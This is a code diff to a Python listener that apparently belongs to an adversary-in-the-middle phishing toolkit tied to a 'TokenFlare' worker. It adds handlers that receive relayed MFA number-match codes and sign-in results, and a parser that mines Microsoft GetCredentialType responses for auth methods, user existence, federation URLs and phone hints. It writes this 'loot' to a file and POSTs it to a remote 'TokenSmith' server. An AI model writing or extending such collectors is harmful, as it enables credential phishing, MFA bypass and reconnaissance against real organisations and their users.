@@ -475,6 +475,33 @@ def create_handler(log_file=None, show_raw=False):
                 self._handle_credential_type_intel(body)
                 return
 
+            # Handle MFA number matching notification
+            if isinstance(body, dict) and body.get('type') == 'mfa_number_match':
+                entropy = body.get('entropy', '?')
+                method = body.get('auth_method', 'unknown')
+                print(f"\n  {C.YELLOW}{C.BOLD}MFA NUMBER MATCH: {entropy}{C.RESET}")
+                print(f"  {C.DIM}Method: {method}{C.RESET}")
+                self._log_and_forward(body)
+                self.send_response(200)
+                self.send_header('Content-Type', 'application/json')
+                self.end_headers()
+                self.wfile.write(json.dumps({'status': 'number_match_received'}).encode())
+                return
+
+            # Handle MFA result notification
+            if isinstance(body, dict) and body.get('type') == 'mfa_result':
+                success = body.get('success', False)
+                method = body.get('auth_method', 'unknown')
+                status_str = f"{C.GREEN}SUCCESS" if success else f"{C.RED}FAILED"
+                print(f"\n  {C.BOLD}MFA Result: {status_str}{C.RESET}")
+                print(f"  {C.DIM}Method: {method}{C.RESET}")
+                self._log_and_forward(body)
+                self.send_response(200)
+                self.send_header('Content-Type', 'application/json')
+                self.end_headers()
+                self.wfile.write(json.dumps({'status': 'mfa_result_received'}).encode())
+                return
+
             # Route based on path
             path = self.path.rstrip('/')
             if path == '/exchange':
@@ -515,6 +542,144 @@ def create_handler(log_file=None, show_raw=False):
             t.daemon = True
             t.start()
 
+        def _parse_gct_intel(self, data):
+            """Deep parse GetCredentialType response for security intelligence."""
+            intel = {
+                'auth_methods': [],
+                'federation': {},
+                'tenant_info': {},
+                'user_info': {},
+                'security_posture': [],
+            }
+
+            if not isinstance(data, dict):
+                return intel
+
+            # Authentication methods available
+            creds = data.get('Credentials', {})
+            if creds.get('HasPassword'):
+                intel['auth_methods'].append('Password')
+            if creds.get('FidoParams'):
+                intel['auth_methods'].append('FIDO2/Passkey')
+                fido = creds['FidoParams']
+                if isinstance(fido, dict):
+                    intel['security_posture'].append({
+                        'control': 'FIDO2',
+                        'status': 'available',
+                        'detail': 'FIDO2/Passkey configured',
+                    })
+            if creds.get('HasRemoteNGC'):
+                intel['auth_methods'].append('Windows Hello for Business')
+            if creds.get('SasParams'):
+                intel['auth_methods'].append('MFA (Push/TOTP/SMS)')
+                sas = creds['SasParams']
+                if isinstance(sas, dict):
+                    methods = sas.get('MFAAuthMethod', '')
+                    if methods:
+                        intel['auth_methods'].append(f'MFA methods: {methods}')
+            if creds.get('CertAuthParams'):
+                intel['auth_methods'].append('Certificate-based Auth')
+            if creds.get('HasAccessPass'):
+                intel['auth_methods'].append('Temporary Access Pass (TAP)')
+            if creds.get('HasPhone'):
+                intel['auth_methods'].append('Phone Sign-in')
+            if creds.get('HasLinkedInFed'):
+                intel['auth_methods'].append('LinkedIn Federation')
+            if creds.get('HasGitHubFed'):
+                intel['auth_methods'].append('GitHub Federation')
+            if creds.get('GoogleParams'):
+                intel['auth_methods'].append('Google Federation')
+
+            # Federation details (reveals internal infrastructure!)
+            fed_url = data.get('FederationRedirectUrl', '')
+            if fed_url:
+                intel['federation']['redirect_url'] = fed_url
+                intel['federation']['type'] = 'federated'
+                intel['security_posture'].append({
+                    'control': 'Federation',
+                    'status': 'configured',
+                    'detail': f'Federation URL: {fed_url}',
+                })
+
+            fed_metadata = data.get('FederationMetadataUrl', '')
+            if fed_metadata:
+                intel['federation']['metadata_url'] = fed_metadata
+
+            fed_active = data.get('FederationActiveAuthUrl', '')
+            if fed_active:
+                intel['federation']['active_auth_url'] = fed_active
+
+            # Tenant branding (confirms target tenant)
+            ests = data.get('EstsProperties', {})
+            if isinstance(ests, dict):
+                branding = ests.get('UserTenantBranding', {})
+                if isinstance(branding, dict) and branding:
+                    intel['tenant_info']['has_branding'] = True
+                    intel['tenant_info']['banner_logo'] = branding.get('BannerLogo', '')
+                    intel['tenant_info']['tile_logo'] = branding.get('TileLogo', '')
+                    intel['tenant_info']['background'] = branding.get('BackgroundImage', '')
+
+                desktop_sso = ests.get('DesktopSsoEnabled')
+                if desktop_sso:
+                    intel['security_posture'].append({
+                        'control': 'Desktop SSO',
+                        'status': 'enabled',
+                        'detail': 'Seamless SSO (Desktop SSO) is enabled',
+                    })
+
+            # User type info
+            if_exists = data.get('IfExistsResult', -1)
+            if if_exists == 0:
+                intel['user_info']['exists'] = True
+                intel['user_info']['type'] = 'managed'
+            elif if_exists == 1:
+                intel['user_info']['exists'] = False
+            elif if_exists == 5:
+                intel['user_info']['exists'] = True
+                intel['user_info']['type'] = 'federated'
+            elif if_exists == 6:
+                intel['user_info']['exists'] = True
+                intel['user_info']['type'] = 'external (B2B guest)'
+
+            # Display hint (partial phone numbers etc.)
+            display_info = data.get('Display', '')
+            if display_info:
+                intel['user_info']['display'] = display_info
+
+            # Preferred credential type
+            pref_cred = data.get('PreferredCredential')
+            if pref_cred is not None:
+                cred_types = {
+                    0: 'Password',
+                    1: 'FIDO2',
+                    3: 'Passwordless Phone Sign-in',
+                    4: 'FIDO2',
+                    6: 'Windows Hello',
+                }
+                intel['user_info']['preferred_auth'] = cred_types.get(pref_cred, f'Type {pref_cred}')
+
+            return intel
+
+        def _log_and_forward(self, payload):
+            """Log event and forward to TokenSmith if configured."""
+            if log_file:
+                try:
+                    with log_lock:
+                        with open(log_file, 'a') as f:
+                            f.write(json.dumps(payload) + '\n')
+                except Exception:
+                    pass
+
+            if hasattr(self.server, 'tokensmith_url') and self.server.tokensmith_url:
+                try:
+                    url = self.server.tokensmith_url.rstrip('/') + '/api/tokenflare/intel'
+                    req_data = json.dumps(payload).encode('utf-8')
+                    req = urllib.request.Request(url, data=req_data,
+                        headers={'Content-Type': 'application/json'}, method='POST')
+                    urllib.request.urlopen(req, timeout=10)
+                except Exception:
+                    pass
+
         def _handle_credential_type_intel(self, payload):
             """Handle GetCredentialType intel from TokenFlare worker."""
             now = datetime.now().strftime('%H:%M:%S')
@@ -530,57 +695,63 @@ def create_handler(log_file=None, show_raw=False):
                     pass
 
             if isinstance(data, dict):
-                creds = data.get('Credentials', {})
-                methods = []
-                if creds.get('HasPassword'):
-                    methods.append('Password')
-                if creds.get('FidoParams'):
-                    methods.append('FIDO2/Passkey')
-                if creds.get('HasRemoteNGC'):
-                    methods.append('Windows Hello')
-                if creds.get('SasParams'):
-                    methods.append('MFA (Push/TOTP/SMS)')
-                if creds.get('CertAuthParams'):
-                    methods.append('Certificate')
-                if creds.get('HasAccessPass'):
-                    methods.append('TAP (Temp Access Pass)')
-                print(f"  Available methods: {', '.join(methods) if methods else 'Unknown'}")
+                intel = self._parse_gct_intel(data)
 
-                fed = data.get('FederationRedirectUrl', '')
-                if fed:
-                    print(f"  Federation: {fed}")
+                print(f"\n  {C.CYAN}{C.BOLD}CREDENTIAL TYPE INTEL{C.RESET}")
+                print(f"  {C.DIM}{'─' * 50}{C.RESET}")
 
-                tenant = data.get('EstsProperties', {}).get('UserTenantBranding', {})
-                if tenant:
-                    print(f"  Tenant branding detected")
+                # Auth methods
+                if intel['auth_methods']:
+                    print(f"  {C.BOLD}Available Auth Methods:{C.RESET}")
+                    for method in intel['auth_methods']:
+                        print(f"    \u2022 {method}")
+
+                # User info
+                if intel['user_info']:
+                    user = intel['user_info']
+                    if 'exists' in user:
+                        status = '\u2713 exists' if user['exists'] else '\u2717 not found'
+                        print(f"  {C.BOLD}User:{C.RESET} {status} ({user.get('type', 'unknown')})")
+                    if 'preferred_auth' in user:
+                        print(f"  {C.BOLD}Preferred Auth:{C.RESET} {user['preferred_auth']}")
+                    if 'display' in user:
+                        print(f"  {C.BOLD}Display Hint:{C.RESET} {user['display']}")
+
+                # Federation
+                if intel['federation']:
+                    fed = intel['federation']
+                    print(f"  {C.BOLD}Federation:{C.RESET}")
+                    if 'redirect_url' in fed:
+                        print(f"    {C.YELLOW}Redirect: {fed['redirect_url']}{C.RESET}")
+                    if 'metadata_url' in fed:
+                        print(f"    Metadata: {fed['metadata_url']}")
+                    if 'active_auth_url' in fed:
+                        print(f"    Active Auth: {fed['active_auth_url']}")
+
+                # Tenant info
+                if intel['tenant_info'].get('has_branding'):
+                    print(f"  {C.BOLD}Tenant:{C.RESET} Custom branding detected")
+
+                # Security posture
+                if intel['security_posture']:
+                    print(f"  {C.BOLD}Security Controls:{C.RESET}")
+                    for sp in intel['security_posture']:
+                        print(f"    [{sp['status'].upper()}] {sp['control']}: {sp['detail']}")
+
+                print(f"  {C.DIM}{'─' * 50}{C.RESET}")
             else:
                 print(f"  {C.DIM}(raw data unparseable){C.RESET}")
 
             print(separator)
 
-            # Log to loot file if configured
-            if log_file:
-                entry = {
-                    'timestamp': datetime.now().isoformat(),
-                    'type': 'credential_type_intel',
-                    'data': data,
-                    'raw': payload,
-                }
-                with log_lock:
-                    with open(log_file, 'a') as f:
-                        f.write(json.dumps(entry) + '\n')
-
-            # Forward to TokenSmith if configured
-            if hasattr(self.server, 'tokensmith_url') and self.server.tokensmith_url:
-                try:
-                    url = self.server.tokensmith_url.rstrip('/') + '/api/tokenflare/intel'
-                    req_data = json.dumps(payload).encode('utf-8')
-                    req = urllib.request.Request(
-                        url, data=req_data,
-                        headers={'Content-Type': 'application/json'}, method='POST')
-                    urllib.request.urlopen(req, timeout=10)
-                except Exception as e:
-                    print(f"  {C.DIM}Intel forward failed: {e}{C.RESET}")
+            # Log and forward
+            log_entry = {
+                'timestamp': datetime.now().isoformat(),
+                'type': 'credential_type_intel',
+                'data': data,
+                'raw': payload,
+            }
+            self._log_and_forward(log_entry)
 
             self.send_response(200)
             self.send_header('Content-Type', 'application/json')
